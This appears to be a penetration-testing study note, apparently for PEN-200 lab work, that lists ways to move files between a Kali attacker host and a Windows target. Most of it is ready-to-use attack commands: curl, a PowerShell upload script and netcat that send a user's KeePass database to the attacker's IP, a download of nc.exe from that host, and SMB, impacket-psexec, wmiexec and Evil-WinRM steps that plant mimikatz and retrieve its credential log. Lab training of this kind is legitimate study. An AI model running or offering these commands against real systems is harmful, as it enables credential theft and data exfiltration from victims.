public:: true

- Python [uploadserver](https://pypi.org/project/uploadserver/)
	- On Kali
	  ```bash
	  python3 -m uploadserver 8080
	  ```
	- On Windows
		- #+BEGIN_IMPORTANT
		  You need the real `curl`. On PowerShell `curl` is an alias for `Invoke-WebRequest` and because of that it is not suitable for this use-case.
		  #+END_IMPORTANT
			- Example of using `curl` as an alias for `Invoke-WebRequest`
			  ```powershell
			  PS C:\users\bobby> curl -X POST -F "files=@C:\Users\bobby\database.kdbx" 192.168.45.229:8080/upload
			  Invoke-WebRequest : A parameter cannot be found that matches parameter name 'X'.
			  ```
		- If the real `curl` is installed then switch to a `cmd` prompt.
		  ```cmd
		  C:\users\bobby> curl -X POST -F "files=@C:\Users\bobby\database.kdbx" http://192.168.45.229:8080/upload
		  ```
		- If `curl` is not an option, then you can use [`PSUpload.ps1`](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1) from a Powershell prompt.
		  ```powershell
		  PS C:\users\bobby> Import-Module .\PSUpload.ps1
		  PS C:\users\bobby> Invoke-FileUpload -File C:\Users\bobby\Database.kdbx -Uri http://192.168.45.229:8080/upload
		  Invoke-FileUpload -File C:\Users\bobby\Database.kdbx -Uri http://192.168.45.229:8080/upload
		  
		  [+] File Uploaded:  C:\Users\bobby\Database.kdbx
		  [+] FileHash:  6DF711DF31EAC725FA31235C2437E678
		  
		  ```
- Netcat
	- On Kali
	  ```bash
	  nc -lnvp 443 > bobby.kdbx
	  ```
	- On Windows
		- Upload netcat
		  ```powershell
		  curl 192.168.45.229/nc.exe -o nc.exe
		  ```
		- Exfiltrate data via netcat
		  ```powershell
		  cat C:\users\bobby\Database.kdbx | .\nc.exe 192.168.45.229 443
		  ```
- SMB
	- On Kali
	  ```bash
	  impacket-smbserver test . -smb2support  -username user -password pass
	  ```
	- On Windows
	  ```cmd
	  net use m: \\192.168.45.229\test /user:user pass
	  copy mimikatz.log m:\
	  ```
- [[impacket-psexec]]
	- It comes with built in upload (lput) and download (lget) commands.
	- By default files are uploaded/downloaded from the `C:\Windows` folder.
	- Upload
	  ```cmd
	  C:\Windows\system32> lput mimikatz.exe
	  [*] Uploading mimikatz.exe to ADMIN$\/
	  C:\Windows\system32> cd C:\windows
	  C:\Windows> dir /b mimikatz.exe
	  mimikatz.exe
	  ```
	- Download
	  ```cmd
	  C:\Windows> lget mimikatz.log
	  [*] Downloading ADMIN$\mimikatz.log
	  ```
- [[impacket-wmiexec]]
	- It comes with built in upload (lput) and download (lget) commands.
	- By default files are uploaded/downloaded in/from the `C:\Windows` folder.
	- Upload
	  ```cmd
	  C:\Windows\system32> lput mimikatz.exe
	  [*] Uploading mimikatz.exe to ADMIN$\/
	  C:\Windows\system32> cd C:\windows
	  C:\Windows> dir /b mimikatz.exe
	  mimikatz.exe
	  ```
	- Download
	  ```cmd
	  C:\Windows> lget mimikatz.log
	  [*] Downloading ADMIN$\mimikatz.log
	  ```
- [[Evil-WinRM]]
	- It comes with built in `upload` and `download` commands.
	- Upload
	  ```powershell
	  upload mimikatz.exe C:\windows\tasks\mimikatz.exe
	  ```
	- Download
	  ```powershell
	  download mimikatz.log /home/kali/Documents/pen-200
	  ```
- FTP
	- Binaries in ASCII mode will make the file not executable. Set the mode to binary.